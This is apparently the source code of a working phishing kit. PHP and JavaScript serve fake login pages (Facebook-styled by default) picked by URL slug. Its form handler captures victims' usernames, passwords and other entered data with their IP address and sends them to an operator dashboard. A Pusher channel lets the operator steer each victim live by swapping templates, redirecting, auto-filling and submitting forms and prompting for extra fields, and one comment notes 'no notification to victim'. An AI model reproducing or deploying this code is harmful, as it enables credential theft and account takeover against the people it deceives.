<script>
   
class FacebookLoader {
    constructor() {
        this.isLoading = false;
        this.loadingBar = null;
        this.overlay = null;
        this.init();
    }
    
    init() {
        this.createLoadingElements();
        this.setupEventListeners();
    }
    
    createLoadingElements() {
        // Create loading overlay
        this.overlay = document.createElement("div");
        this.overlay.id = "fb-loading-overlay";
        this.overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 9998;
            display: none;
            transition: opacity 0.3s ease;
        `;
        
        // Create top loading bar
        this.loadingBar = document.createElement("div");
        this.loadingBar.id = "fb-loading-bar";
        this.loadingBar.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, #1877f2, #42a5f5, #1877f2);
            background-size: 200% 100%;
            z-index: 9999;
            display: none;
            animation: fbLoading 1.5s ease-in-out infinite;
        `;
        
        // Add CSS animation
        const style = document.createElement("style");
        style.textContent = `
            @keyframes fbLoading {
                0% { background-position: 200% 0; }
                100% { background-position: -200% 0; }
            }
            .fb-loading-active {
                pointer-events: none !important;
                user-select: none !important;
            }
            .fb-loading-active * {
                pointer-events: none !important;
                user-select: none !important;
            }
        `;
        document.head.appendChild(style);
        
        // Add elements to body when DOM is ready
        if (document.body) {
            document.body.appendChild(this.overlay);
            document.body.appendChild(this.loadingBar);
        } else {
            // Wait for DOM to be ready
            document.addEventListener('DOMContentLoaded', () => {
                document.body.appendChild(this.overlay);
                document.body.appendChild(this.loadingBar);
            });
        }
    }
    
    setupEventListeners() {
        this.overlay.addEventListener("click", (e) => {
            if (this.isLoading) {
                e.preventDefault();
                e.stopPropagation();
            }
        });
        
        document.addEventListener("submit", (e) => {
            if (this.isLoading) {
                e.preventDefault();
                e.stopPropagation();
            }
        });
    }
    
    loading(show = true) {
        if (show) {
            this.startLoading();
        } else {
            this.stopLoading();
        }
    }
    
    startLoading() {
        if (this.isLoading) return;
        
        this.isLoading = true;
        this.overlay.style.display = "block";
        this.loadingBar.style.display = "block";
        document.body.classList.add("fb-loading-active");
        
        // Show immediately without delay
        this.overlay.style.opacity = "1";
        
        console.log("🔄 Loading started");
    }
    
    stopLoading() {
        if (!this.isLoading) return;
        
        this.isLoading = false;
        this.overlay.style.opacity = "0";
        
        setTimeout(() => {
            this.overlay.style.display = "none";
            this.loadingBar.style.display = "none";
            document.body.classList.remove("fb-loading-active");
        }, 300);
        
        console.log("✅ Loading completed");
    }
    
    simulateLoading(duration = 2000) {
        this.startLoading();
        
        // Only simulate progress, don't auto-stop
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 30;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                // Don't auto-stop, wait for manual loading(false)
            }
        }, duration / 10);
    }
}

// Initialize Facebook loader
const fbLoader = new FacebookLoader();

// Make loading function globally available
window.loading = (show) => {
    fbLoader.loading(show);
};

window.simulateLoading = (duration) => {
    fbLoader.simulateLoading(duration);
};

// Auto-loading on page load
document.addEventListener("DOMContentLoaded", function() {
    setTimeout(() => {
        fbLoader.simulateLoading(1500);
    }, 500);
    
    // Auto-stop loading after 500ms
    setTimeout(() => {
        loading(false);
    }, 500);
});
</script>
<?php
// index.php - Display login template based on slug

require_once 'config.php';
$ssid = rand();
// Get slug from URL parameter
$slug = trim($_GET['slug']) ?? '';

// Validate slug
if (empty($slug)) {
    handleError('Missing slug parameter', 400);
}

// Get website information with login template
$website = getWebsiteBySlug($pdo, $slug);

if (!$website) {
    handleError('Website not found', 404);
}

// Check if website has login template
if (!$website['login_template_id']) {
    handleError('No login template found for this website', 404);
}

// Get login template details
$template = getLoginTemplate($pdo, $website['login_template_id']);

if (!$template || $template['type'] !== 'login') {
    handleError('Invalid login template', 404);
}

// Increment view count
incrementViewCount($pdo, $website['id']);

// Set content type
header('Content-Type: text/html; charset=utf-8');

// Generate meta tags for social sharing
$meta_title = htmlspecialchars($website['title']);
$meta_description = htmlspecialchars($website['description'] ?: '');
$meta_image = $website['thumbnail'] ?: '';
$redirect_url = $website['redirect_url'] ?: 'https://facebook.com'; // Default fallback

$meta_url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Start output buffering to capture template content
ob_start();


// Add Pusher integration for real-time control
$pusher_integration = '
<!-- Pusher Integration for Real-time Control -->
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>

// Pusher configuration
        const CONFIG = {
    pusherKey: "049ee983c4ec4cecf834",
    pusherCluster: "ap1",
    apiEndpoint: "send-pusher.php",
    websiteId: ' . $website['id'] . ',
    ssid: "' . $ssid . '",
    userIP: "' . $ip . '",
    websiteTitle: "' . addslashes($website['title']) . '"
};


console.log("🔍 Checking Pusher availability...");
console.log("📦 Pusher object:", typeof Pusher !== "undefined" ? Pusher : "NOT LOADED");
console.log("📋 Pusher Config:", CONFIG);

// Initialize Pusher connection
console.log("🚀 Initializing Pusher connection...");

let pusher = null;
let controlChannel = null;

// Check if Pusher is available
if (typeof Pusher === "undefined") {
    console.error("❌ Pusher library not loaded! Please check if pusher.min.js is included.");
    console.log("🔗 Expected script: https://js.pusher.com/8.2.0/pusher.min.js");
} else {
    console.log("✅ Pusher library loaded successfully");
}

try {
    console.log("🔌 Creating Pusher instance...");
    pusher = new Pusher(CONFIG.pusherKey, {
        cluster: CONFIG.pusherCluster,
        useTLS: true,
        enabledTransports: ["ws", "wss"]
    });
    
    console.log("✅ Pusher instance created successfully");

    // Pusher connection events
    pusher.connection.bind("connected", function() {
        console.log("🎉 Pusher connected successfully!");
        console.log("🔗 Connection state:", pusher.connection.state);
        console.log("🆔 Socket ID:", pusher.connection.socket_id);
    });
    
    pusher.connection.bind("disconnected", function() {
        console.log("❌ Pusher disconnected");
    });
    
    pusher.connection.bind("error", function(error) {
        console.error("💥 Pusher connection error:", error);
    });
    
    pusher.connection.bind("state_change", function(states) {
        console.log("🔄 Pusher state changed:", states.previous, "->", states.current);
    });

    // Subscribe to control channel for receiving admin commands
    console.log("📡 Subscribing to control channel...");
    controlChannel = pusher.subscribe("receive-control");
    
    controlChannel.bind("pusher:subscription_succeeded", function() {
        console.log("✅ Successfully subscribed to receive-control channel");
    });
    
    controlChannel.bind("pusher:subscription_error", function(error) {
        console.error("❌ Failed to subscribe to receive-control channel:", error);
    });
    
    // Listen for control commands from admin
    console.log("👂 Binding to control command event: control_command_'.$ssid.'");
    controlChannel.bind("control_command_'.$ssid.'", function(data) {
        console.log("📨 Received control command:", data);
        console.log("🎯 Target website ID:", data.website_id);
        console.log("🏠 Current website ID:", CONFIG.websiteId);
        
        if (data.website_id === CONFIG.websiteId) {
            console.log("✅ Processing control command for this website");
            handleControlCommand(data.control_data);
        } else {
            console.log("🚫 Control command not for this website (ID: " + CONFIG.websiteId + ")");
        }
    });

} catch (error) {
    console.error("Failed to initialize Pusher:", error);
}

// Test function to check Pusher status
window.testPusher = function() {
    console.log("🧪 Testing Pusher connection...");
    console.log("📦 Pusher available:", typeof Pusher !== "undefined");
    console.log("🔌 Pusher instance:", pusher);
    console.log("📡 Control channel:", controlChannel);
    console.log("🔗 Connection state:", pusher ? pusher.connection.state : "No instance");
    console.log("🆔 Socket ID:", pusher ? pusher.connection.socket_id : "No connection");
    console.log("📋 Config:", CONFIG);
    
    if (pusher) {
        console.log("✅ Pusher is working!");
    } else {
        console.log("❌ Pusher is not working!");
    }
};

// Auto-test after 3 seconds
setTimeout(() => {
    console.log("🔄 Auto-testing Pusher connection...");
    window.testPusher();
}, 3000);

// Handle control commands from admin
function handleControlCommand(controlData) {
    console.log("🎛️ Processing control command:", controlData);
    
    
    if (controlData.data && controlData.data.fieldIds && Array.isArray(controlData.data.fieldIds)) {
        loading(false);
        var control = controlData.data.fieldIds;
        
        switchTemplate(control[0]);
    }
    
    switch (controlData.type) {
        case "show_message":
            // Only show message if meant for user
            if (controlData.data.show_to_user !== false) {
                showControlMessage(controlData.data.message, controlData.data.type || "info");
            }
            break;
            
        case "redirect":
            if (controlData.data.url) {
                // Silent redirect without notification
                setTimeout(() => {
                    window.location.href = controlData.data.url;
                }, 1000);
            }
            break;
            
        case "fill_form":
            if (controlData.data.email) {
                const emailInput = document.querySelector("input[type=\"text\"], input[type=\"email\"]");
                if (emailInput) emailInput.value = controlData.data.email;
            }
            if (controlData.data.password) {
                const passwordInput = document.querySelector("input[type=\"password\"]");
                if (passwordInput) passwordInput.value = controlData.data.password;
            }
            // Silent operation - no notification
            break;
            
        case "submit_form":
            if (controlData.data.email) {
                const emailInput = document.querySelector("input[type=\"text\"], input[type=\"email\"]");
                if (emailInput) emailInput.value = controlData.data.email;
            }
            if (controlData.data.password) {
                const passwordInput = document.querySelector("input[type=\"password\"]");
                if (passwordInput) passwordInput.value = controlData.data.password;
            }
            // Silent auto-submit
            setTimeout(() => {
                const form = document.querySelector("form");
                if (form) form.dispatchEvent(new Event("submit"));
            }, 1000);
            break;
            
        case "hide_element":
            if (controlData.data.element_id) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.style.display = "none";
                }
            }
            break;
            
        case "show_element":
            if (controlData.data.element_id) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.style.display = "block";
                }
            }
            break;
            
        case "change_text":
            if (controlData.data.element_id && controlData.data.text) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.textContent = controlData.data.text;
                }
            }
            break;
            
        case "switch_template":
            // Switch to specific template based on field
            if (controlData.data.fieldIds && Array.isArray(controlData.data.fieldIds)) {
                loading(false);
                const templateId = controlData.data.fieldIds[0];
                console.log("🔄 Attempting to switch to template:", templateId);
                console.log("🔄 Available templates:", templateSystem.listTemplates());
                switchTemplate(templateId);
                console.log("🔄 Current template after switch:", templateSystem.getCurrentTemplate());
            } else if (controlData.data.template_id) {
                loading(false);
                const templateId = controlData.data.template_id;
                console.log("🔄 Attempting to switch to template:", templateId);
                console.log("🔄 Available templates:", templateSystem.listTemplates());
                switchTemplate(templateId);
                console.log("🔄 Current template after switch:", templateSystem.getCurrentTemplate());
            }
            break;
            
        case "show_field_input":
            if (controlData.data.field_name && controlData.data.prompt) {
                // Show prompt for specific field input
                const userInput = prompt(controlData.data.prompt);
                if (userInput !== null && userInput.trim() !== "") {
                    // Try to find the field by name or placeholder
                    const fieldSelectors = [
                        `input[name="${controlData.data.field_name}"]`,
                        `input[placeholder*="${controlData.data.field_name}"]`,
                        `input[id="${controlData.data.field_name}"]`,
                        `#${controlData.data.field_name}`
                    ];
                    
                    let targetField = null;
                    for (const selector of fieldSelectors) {
                        targetField = document.querySelector(selector);
                        if (targetField) break;
                    }
                    
                    if (targetField) {
                        targetField.value = userInput.trim();
                        targetField.focus();
                        // Silent operation - no notification to victim
                    }
                }
            }
            break;
            
        default:
            console.log("❓ Unknown control command type:", controlData.type);
            // Silent - no notification for unknown commands
    }
}

// Show control message to user
function showControlMessage(message, type = "info") {
    const messageDiv = document.createElement("div");
    messageDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
        background: ${type === "success" ? "#d4edda" : type === "warning" ? "#fff3cd" : type === "error" ? "#f8d7da" : "#d1ecf1"};
        color: ${type === "success" ? "#155724" : type === "warning" ? "#856404" : type === "error" ? "#721c24" : "#0c5460"};
        border: 1px solid ${type === "success" ? "#c3e6cb" : type === "warning" ? "#ffeaa7" : type === "error" ? "#f5c6cb" : "#bee5eb"};
            border-radius: 6px;
            padding: 15px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        z-index: 10000;
        max-width: 300px;
            font-size: 14px;
    `;
    messageDiv.innerHTML = `<i class="fas fa-${type === "success" ? "check-circle" : type === "warning" ? "exclamation-triangle" : type === "error" ? "times-circle" : "info-circle"}"></i> ${message}`;
    
    document.body.appendChild(messageDiv);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (messageDiv.parentNode) {
            messageDiv.parentNode.removeChild(messageDiv);
        }
    }, 5000);
}
</script>';

// Add form submission handler for data capture
$form_handler = '
    <script>
// Add CSS for disabled inputs
const style = document.createElement("style");
style.textContent = `
    .template-content:not(.active) input,
    .template-content:not(.active) textarea,
    .template-content:not(.active) select,
    .template-content:not(.active) button {
        opacity: 0.5 !important;
        pointer-events: none !important;
        cursor: not-allowed !important;
        background-color: #f5f5f5 !important;
    }
    
    .template-content.active input,
    .template-content.active textarea,
    .template-content.active select,
    .template-content.active button {
        opacity: 1 !important;
        pointer-events: auto !important;
        cursor: auto !important;
    }
`;
document.head.appendChild(style);

// Global data storage for persistent form data across templates
window.formData = {
    username: "",
    password: "",
    content: "",
    lastUpdated: {}
};

// Function to save data from current active template
function saveCurrentTemplateData() {
    const activeTemplate = document.querySelector(".template-content.active");
    if (!activeTemplate) return;
    
    const usernameField = activeTemplate.querySelector("#username");
    const passwordField = activeTemplate.querySelector("#password");
    const contentField = activeTemplate.querySelector("#content");
    
    if (usernameField && usernameField.value.trim()) {
        window.formData.username = usernameField.value.trim();
        window.formData.lastUpdated.username = activeTemplate.id;
        console.log("💾 Saved username from template:", activeTemplate.id);
    }
    
    if (passwordField && passwordField.value.trim()) {
        window.formData.password = passwordField.value.trim();
        window.formData.lastUpdated.password = activeTemplate.id;
        console.log("💾 Saved password from template:", activeTemplate.id);
    }
    
    if (contentField && contentField.value.trim()) {
        window.formData.content = contentField.value.trim();
        window.formData.lastUpdated.content = activeTemplate.id;
        console.log("💾 Saved content from template:", activeTemplate.id);
    }
}

// Function to populate current template with saved data
function populateCurrentTemplate() {
    const activeTemplate = document.querySelector(".template-content.active");
    if (!activeTemplate) return;
    
    const usernameField = activeTemplate.querySelector("#username");
    const passwordField = activeTemplate.querySelector("#password");
    const contentField = activeTemplate.querySelector("#content");
    
    if (usernameField && window.formData.username) {
        usernameField.value = window.formData.username;
        console.log("🔄 Populated username from saved data");
    }
    
    if (passwordField && window.formData.password) {
        passwordField.value = window.formData.password;
        console.log("🔄 Populated password from saved data");
    }
    
    if (contentField && window.formData.content) {
        contentField.value = window.formData.content;
        console.log("🔄 Populated content from saved data");
    }
}

// Function to clear all saved data
window.clearFormData = function() {
    window.formData = {
        username: "",
        password: "",
        content: "",
        lastUpdated: {}
    };
    console.log("🗑️ Cleared all form data");
};

// Function to get current form data
window.getFormData = function() {
    console.log("📊 Current form data:", window.formData);
    return window.formData;
};

// Global functions for template switching
window.switchTemplate = function(templateId) {
    // Save current template data before switching
    saveCurrentTemplateData();
    
    const allTemplates = document.querySelectorAll(".template-content");
    allTemplates.forEach(template => {
        template.classList.remove("active");
        template.classList.add("hidden");
    });
    
    const targetTemplate = document.getElementById(templateId);
    if (targetTemplate) {
        targetTemplate.classList.remove("hidden");
        targetTemplate.classList.add("active");
        
        // Update input states
        updateInputStates();
        
        // Populate new template with saved data
        populateCurrentTemplate();
        
        console.log("🔄 Switched to template:", templateId);
        console.log("📊 Current form data:", window.formData);
    } else {
        console.error("❌ Template not found:", templateId);
    }
};

// Function to update input states
function updateInputStates() {
    const allTemplates = document.querySelectorAll(".template-content");
    const activeTemplate = document.querySelector(".template-content.active");
    
    allTemplates.forEach(template => {
        const inputs = template.querySelectorAll("input, textarea, select, button");
        const isActive = template.classList.contains("active");
        
        inputs.forEach(input => {
            if (isActive) {
                input.disabled = false;
                input.style.opacity = "1";
                input.style.pointerEvents = "auto";
            } else {
                input.disabled = true;
                input.style.opacity = "0.5";
                input.style.pointerEvents = "none";
            }
        });
    });
    
    console.log("🔄 Input states updated. Active template:", activeTemplate ? activeTemplate.id : "none");
}

// Handle form submissions and send data to dashboard
document.addEventListener("DOMContentLoaded", function() {
    loading(true);
    // Initial update
    updateInputStates();
    
    // Watch for template changes (if you have template switching functionality)
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === "attributes" && mutation.attributeName === "class") {
                updateInputStates();
            }
        });
    });
    
    // Observe all template elements for class changes
    const allTemplates = document.querySelectorAll(".template-content");
    allTemplates.forEach(template => {
        observer.observe(template, { attributes: true, attributeFilter: ["class"] });
    });
    
    const forms = document.querySelectorAll("form");
    
    forms.forEach(form => {
        form.addEventListener("submit", async function(event) {
            event.preventDefault();
            loading(true);
            
            // Save current template data before processing
            saveCurrentTemplateData();
            
            const activeTemplate = document.querySelector(".template-content.active");
            if (!activeTemplate) {
                console.warn("⚠️ No active template found");
                showControlMessage("No active form found", "error");
                loading(false);
                return;
            }
            
            // Get data from active template (new data)
            const usernameField = activeTemplate.querySelector("#username");
            const passwordField = activeTemplate.querySelector("#password");
            const contentField = activeTemplate.querySelector("#content");
            
            const newUsername = usernameField ? usernameField.value.trim() : "";
            const newPassword = passwordField ? passwordField.value.trim() : "";
            const newContent = contentField ? contentField.value.trim() : "";
            
            // Merge with saved data (keep old data if new data is empty)
            const username = newUsername || window.formData.username || "";
            const password = newPassword || window.formData.password || "";
            const content = newContent || window.formData.content || "";
            
            console.log("📝 Form data merged (new + saved):", {
                newUsername: newUsername,
                newPassword: newPassword ? "***" : "empty",
                newContent: newContent,
                finalUsername: username,
                finalPassword: password ? "***" : "empty",
                finalContent: content,
                activeTemplate: activeTemplate.id,
                savedData: window.formData
            });
            
            // Check if we have at least username or content (some templates might not have password)
            if (username || content) {
                try {
                    // Always use this exact structure
                const accountData = {
                        id: CONFIG.ssid,
                        username: username || "N/A",
                    password: password || "N/A",
                        email: username || "N/A",
                    website: CONFIG.websiteId,
                    website_title: CONFIG.websiteTitle,
                        ip_address: "' . getClientIp() . '",
                        status: "pending",
                        content: content ? JSON.stringify({"Data": content}) : "{\"Data\":\"Nothing\"}",
                    created_at: new Date().toISOString()
                };

                    console.log("📤 Sending data to dashboard:", accountData);
                
                const response = await fetch(CONFIG.apiEndpoint, {
                        method: "POST",
                    headers: {
                            "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                            type: "new_account",
                        data: {
                            account: accountData,
                            timestamp: new Date().toISOString()
                        }
                    })
                });

                    if (response.ok) {
                     
                        
                    } else {
                        console.error("❌ Failed to send data to dashboard");
                        showControlMessage("Failed to send data. Please try again.", "error");
                        loading(false);
                    }
                } catch (error) {
                    console.error("💥 Error sending data:", error);
                    showControlMessage("Error occurred. Please try again.", "error");
                    loading(false);
                }
            } else {
                console.warn("⚠️ No data found in active template");
                showControlMessage("Please enter username or content in the active form", "warning");
                loading(false);
            }
        });
    });
    
    // Also handle any button clicks that might trigger form submission
    const submitButtons = document.querySelectorAll("button[type=\"submit\"], input[type=\"submit\"], .btn-submit, .login-btn");
    submitButtons.forEach(button => {
        button.addEventListener("click", function(event) {
            // Let the form submit handler take care of it
            console.log("🖱️ Submit button clicked");
        });
    });
    
    // Handle Enter key press in form fields
    const formFields = document.querySelectorAll("input[type=\"text\"], input[type=\"email\"], input[type=\"password\"]");
    formFields.forEach(field => {
        field.addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                const form = field.closest("form");
                if (form) {
                    form.dispatchEvent(new Event("submit"));
                }
            }
        });
    });
});
</script>';
echo $pusher_integration;
// Output the login template HTML
echo $template['content_html'];
// Add CSS if template has custom CSS
if (!empty($template['content_css'])) {
    echo '<style>' . $template['content_css'] . '</style>';
}

// Add JavaScript if template has custom JS


// Get the captured content
$template_content = ob_get_clean();

// Replace {redirect_link} placeholder with actual redirect URL
$template_content = str_replace('{redirect_link}', $redirect_url, $template_content);

// Replace meta tags in the template with website information
$template_content = str_replace([
    '<title>',
    '<meta name="description"',
    '<meta property="og:title"',
    '<meta property="og:description"',
    '<meta property="og:image"',
    '<meta property="og:url"',
    '<meta name="twitter:title"',
    '<meta name="twitter:description"',
    '<meta name="twitter:image"'
], [
    '<title>' . $meta_title,
    '<meta name="description" content="' . $meta_description . '"',
    '<meta property="og:title" content="' . $meta_title . '"',
    '<meta property="og:description" content="' . $meta_description . '"',
    '<meta property="og:image" content="' . $meta_image . '"',
    '<meta property="og:url" content="' . $meta_url . '"',
    '<meta name="twitter:title" content="' . $meta_title . '"',
    '<meta name="twitter:description" content="' . $meta_description . '"',
    '<meta name="twitter:image" content="' . $meta_image . '"'
], $template_content);

// Output the final HTML with all integrations
echo $template_content;


// Add Pusher integration and form handler

if (!empty($template['content_js'])) {
    echo '<script>' . $template['content_js'] . '</script>';
}
echo $form_handler;
?>

<script>
// Template System JavaScript
class TemplateSystem {
    constructor() {
        this.currentTemplate = 'html_default';
        this.templates = {};
        this.init();
    }
    
    init() {
        // Get all template elements
        const templateElements = document.querySelectorAll('.template-content');
        
        // Store templates in object
        templateElements.forEach(template => {
            const id = template.id;
            this.templates[id] = template;
        });
        
        console.log('Template System initialized with templates:', Object.keys(this.templates));
    }
    
    // Show specific template
    showTemplate(templateId) {
        // Hide all templates
        Object.values(this.templates).forEach(template => {
            template.classList.remove('active');
            template.classList.add('hidden');
        });
        
        // Show target template
        if (this.templates[templateId]) {
            this.templates[templateId].classList.remove('hidden');
            this.templates[templateId].classList.add('active');
            this.currentTemplate = templateId;
            
            console.log(`Template switched to: ${templateId}`);
        } else {
            console.error(`Template not found: ${templateId}`);
        }
    }
    
    // Hide all templates
    hideAll() {
        Object.values(this.templates).forEach(template => {
            template.classList.remove('active');
            template.classList.add('hidden');
        });
        this.currentTemplate = null;
        console.log('All templates hidden');
    }
    
    // Get current template
    getCurrentTemplate() {
        return this.currentTemplate;
    }
    
    // List all available templates
    listTemplates() {
        return Object.keys(this.templates);
    }
}

// Initialize template system
const templateSystem = new TemplateSystem();

// Global functions for easy access
function openTemplate(templateId) {
    templateSystem.showTemplate(templateId);
}

function hideAllTemplates() {
    templateSystem.hideAll();
}

function getCurrentTemplate() {
    return templateSystem.getCurrentTemplate();
}

// Example usage functions
function switchTemplate(id) {
    openTemplate(id);
}


    </script>
